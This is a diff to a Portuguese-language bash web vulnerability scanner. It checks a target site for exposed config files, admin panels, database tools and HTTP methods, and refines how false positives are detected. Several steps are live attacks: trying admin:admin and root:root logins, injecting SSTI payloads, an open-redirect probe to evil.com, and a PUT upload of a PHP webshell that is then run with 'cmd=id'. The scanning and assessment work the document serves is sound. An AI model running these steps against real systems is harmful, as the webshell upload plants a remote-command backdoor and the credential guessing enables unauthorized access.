@@ -293,16 +293,32 @@ fi
 # ===== PASSO 8: ARQUIVOS SENSIVEIS =====
 progresso "Procurando arquivos sensiveis"
 for path in admin login backup wp-admin config .git .env .htaccess .svn phpinfo.php test.php info.php debug.php console painel dashboard painel administrativo xmlrpc.php wp-config.php.bak wp-config.php~ dump.sql database.sql server-status server-info crossdomain.xml; do
-  code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 "$ALVO/$path" 2>/dev/null)
+  code=$(curl -s -L -o /dev/null -w "%{http_code}" --max-time 3 "$ALVO/$path" 2>/dev/null)
+  body=$(curl -s -L --max-time 3 "$ALVO/$path" 2>/dev/null | head -c 500)
   if [ "$code" != "000" ]; then
     if [ "$code" = "200" ]; then
-      critico "ACESSO LIVRE: $ALVO/$path (HTTP $code)"
+      case "$path" in
+        admin|login|wp-admin|painel|dashboard|administrativo|console)
+          has_content=$(echo "$body" | grep -ciE "<html|<body|<form|<div|<input" 2>/dev/null)
+          has_cookie=$(echo "$body" | grep -ci "set_cookie\|begetok\|location.reload" 2>/dev/null)
+          [ "$has_content" -gt 2 ] && [ "$has_cookie" -eq 0 ] && critico "ACESSO LIVRE: $ALVO/$path (HTTP $code)"
+          [ "$has_content" -gt 0 ] && [ "$has_cookie" -gt 0 ] && aviso "POSSIVEL FALSO POSITIVO: $ALVO/$path (so seta cookie)"
+          ;;
+        .git) echo "$body" | grep -qi "\[core\]" && critico "REPOSITORIO GIT EXPOSTO: $ALVO/$path" ;;
+        .env) echo "$body" | grep -qi "DB_\|APP_\|SECRET\|PASSWORD\|KEY" && critico "ARQUIVO .ENV EXPOSTO: $ALVO/$path" ;;
+        wp-config.php.bak|wp-config.php~) echo "$body" | grep -qi "DB_NAME\|DB_USER\|DB_PASSWORD\|WP_" && critico "BACKUP WP-CONFIG: $ALVO/$path" ;;
+        dump.sql|database.sql) echo "$body" | grep -qi "CREATE TABLE\|INSERT INTO\|DROP TABLE" && critico "BACKUP BD: $ALVO/$path" ;;
+        phpinfo.php|info.php|test.php|debug.php) echo "$body" | grep -qi "phpinfo\|PHP Version\|PHP License" && critico "INFO PHP EXPOSTA: $ALVO/$path" ;;
+        crossdomain.xml) echo "$body" | grep -qi "allow-access-from" && aviso "CROSSDOMAIN.XML: $ALVO/$path permite acesso externo" ;;
+        *) critico "ACESSO LIVRE: $ALVO/$path (HTTP $code)" ;;
+      esac
     elif [ "$code" = "403" ]; then
       aviso "ACESSO RESTRITO: $ALVO/$path (HTTP $code)"
     elif [ "$code" = "401" ]; then
       aviso "AUTENTICACAO REQUERIDA: $ALVO/$path (HTTP $code)"
     elif [ "$code" = "301" ] || [ "$code" = "302" ]; then
-      aviso "REDIRECIONA: $ALVO/$path (HTTP $code)"
+      redirect_to=$(curl -s -L -o /dev/null -w "%{url_effective}" --max-time 3 "$ALVO/$path" 2>/dev/null)
+      echo "$redirect_to" | grep -qi "$DOMINIO" || aviso "REDIRECIONA EXTERNO: $ALVO/$path -> $redirect_to"
     fi
   fi
 done
@@ -409,14 +425,27 @@ fi
 
 # ===== PASSO 19: METODOS HTTP =====
 progresso "Verificando metodos HTTP"
-curl -s -X OPTIONS -I "$ALVO" 2>/dev/null | grep -i "allow:" | head -5
-curl -s -X PUT -d "test" "$ALVO/test.txt" -o /dev/null -w "%{http_code}" 2>/dev/null | grep -qv "405\|403" && critico "Metodo PUT habilitado!"
+curl -s -X OPTIONS -I -L "$ALVO" 2>/dev/null | grep -i "allow:" | head -5
+PUT_CODE=$(curl -s -L -X PUT -d "test" "$ALVO/test.txt" -o /dev/null -w "%{http_code}" 2>/dev/null)
+echo "$PUT_CODE" | grep -qE "200|201|204" && critico "Metodo PUT habilitado! (HTTP $PUT_CODE)"
 
 # ===== PASSO 20: SERVICOS COMUNS =====
 progresso "Procurando servicos comuns"
 for srv in cgi-bin/ cgi-bin/test.cgi server-status server-info phpMyAdmin phpmyadmin phppgadmin adminer.php mysql phpinfo.php info.php; do
-  code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 "$ALVO/$srv" 2>/dev/null)
-  [ "$code" = "200" ] && critico "SERVICO ENCONTRADO: $ALVO/$srv"
+  code=$(curl -s -L -o /dev/null -w "%{http_code}" --max-time 3 "$ALVO/$srv" 2>/dev/null)
+  body=$(curl -s -L --max-time 3 "$ALVO/$srv" 2>/dev/null)
+  if [ "$code" = "200" ]; then
+    case "$srv" in
+      phpMyAdmin|phpmyadmin) echo "$body" | grep -qi "phpmyadmin\|phpMyAdmin" && critico "SERVICO ENCONTRADO: $ALVO/$srv" ;;
+      phppgadmin) echo "$body" | grep -qi "phppgadmin\|PostgreSQL" && critico "SERVICO ENCONTRADO: $ALVO/$srv" ;;
+      adminer.php) echo "$body" | grep -qi "adminer\|Adminer\|Login\|login" && critico "SERVICO ENCONTRADO: $ALVO/$srv" ;;
+      phpinfo.php|info.php) echo "$body" | grep -qi "phpinfo\|PHP Version\|php version\|PHP License" && critico "SERVICO ENCONTRADO: $ALVO/$srv" ;;
+      mysql) echo "$body" | grep -qi "mysql\|MySQL\|phpMyAdmin" && critico "SERVICO ENCONTRADO: $ALVO/$srv" ;;
+      server-status) echo "$body" | grep -qi "server status\|Apache.*Server\|nginx.*status" && critico "SERVICO ENCONTRADO: $ALVO/$srv" ;;
+      server-info) echo "$body" | grep -qi "server info\|Apache.*Server" && critico "SERVICO ENCONTRADO: $ALVO/$srv" ;;
+      *) critico "SERVICO ENCONTRADO: $ALVO/$srv" ;;
+    esac
+  fi
 done
 
 # ===== PASSO 21: CVE CHECK =====
@@ -458,15 +487,20 @@ echo "$CORS_HEADER" | grep -qi "malicious" && critico "CORS MISCONFIG: Access-Co
 
 info "Testando default credentials..."
 for path in admin login wp-admin painel dashboard administrador; do
-  CRED_TEST=$(curl -s --max-time 3 -u "admin:admin" -o /dev/null -w "%{http_code}" "$ALVO/$path" 2>/dev/null)
-  [ "$CRED_TEST" = "200" ] && critico "DEFAULT CREDENTIALS: admin:admin funciona em $ALVO/$path!"
-  CRED_TEST2=$(curl -s --max-time 3 -u "root:root" -o /dev/null -w "%{http_code}" "$ALVO/$path" 2>/dev/null)
-  [ "$CRED_TEST2" = "200" ] && critico "DEFAULT CREDENTIALS: root:root funciona em $ALVO/$path!"
+  SEM_AUTH=$(curl -s -L --max-time 3 -o /dev/null -w "%{http_code}" "$ALVO/$path" 2>/dev/null)
+  COM_AUTH_ADMIN=$(curl -s -L --max-time 3 -u "admin:admin" -o /dev/null -w "%{http_code}" "$ALVO/$path" 2>/dev/null)
+  COM_AUTH_ROOT=$(curl -s -L --max-time 3 -u "root:root" -o /dev/null -w "%{http_code}" "$ALVO/$path" 2>/dev/null)
+  if [ "$SEM_AUTH" != "$COM_AUTH_ADMIN" ] && [ "$COM_AUTH_ADMIN" = "200" ]; then
+    critico "DEFAULT CREDENTIALS: admin:admin funciona em $ALVO/$path!"
+  fi
+  if [ "$SEM_AUTH" != "$COM_AUTH_ROOT" ] && [ "$COM_AUTH_ROOT" = "200" ]; then
+    critico "DEFAULT CREDENTIALS: root:root funciona em $ALVO/$path!"
+  fi
 done
 
 info "Testando open redirect..."
-REDIR_TEST=$(curl -s -o /dev/null -w "%{redirect_url}" --max-time 3 "${ALVO}?redirect=http://evil.com" 2>/dev/null)
-echo "$REDIR_TEST" | grep -qi "evil.com" && critico "OPEN REDIRECT: parametro redirect aceita URL externa!"
+REDIR_TEST=$(curl -s -L -o /dev/null -w "%{url_effective}" --max-time 3 "${ALVO}?redirect=http://evil.com&url=http://evil.com&next=http://evil.com&return=http://evil.com" 2>/dev/null)
+echo "$REDIR_TEST" | grep -qvi "$DOMINIO" && [ -n "$REDIR_TEST" ] && critico "OPEN REDIRECT: redireciona para dominio externo ($REDIR_TEST)"
 
 info "Testando SSTI (Server-Side Template Injection)..."
 SSTI_PAYLOADS=("{{7*7}}" "\${7*7}" "<%= 7*7 %>" "#{7*7}" "*{7*7}")
@@ -476,11 +510,11 @@ for payload in "${SSTI_PAYLOADS[@]}"; do
 done
 
 info "Testando upload de webshell via PUT..."
-PUT_TEST=$(curl -s -X PUT -d "<?php system(\$_GET['cmd']); ?>" "$ALVO/shell.php" -o /dev/null -w "%{http_code}" 2>/dev/null)
+PUT_TEST=$(curl -s -L -X PUT -d "<?php system(\$_GET['cmd']); ?>" "$ALVO/shell.php" -o /dev/null -w "%{http_code}" 2>/dev/null)
 if [ "$PUT_TEST" = "200" ] || [ "$PUT_TEST" = "201" ] || [ "$PUT_TEST" = "204" ]; then
   critico "WEBSHELL UPLOAD: PUT $ALVO/shell.php funcionou! ($PUT_TEST)"
-  CHECK_SHELL=$(curl -s --max-time 3 "$ALVO/shell.php?cmd=id" 2>/dev/null)
-  [ -n "$CHECK_SHELL" ] && critico "WEBSHELL ACESSAVEL: $ALVO/shell.php?cmd=id"
+  CHECK_SHELL=$(curl -s -L --max-time 3 "$ALVO/shell.php?cmd=id" 2>/dev/null)
+  echo "$CHECK_SHELL" | grep -qi "uid=" && critico "WEBSHELL ACESSAVEL: $ALVO/shell.php?cmd=id"
 fi
 
 info "Verificando phpinfo exposto..."
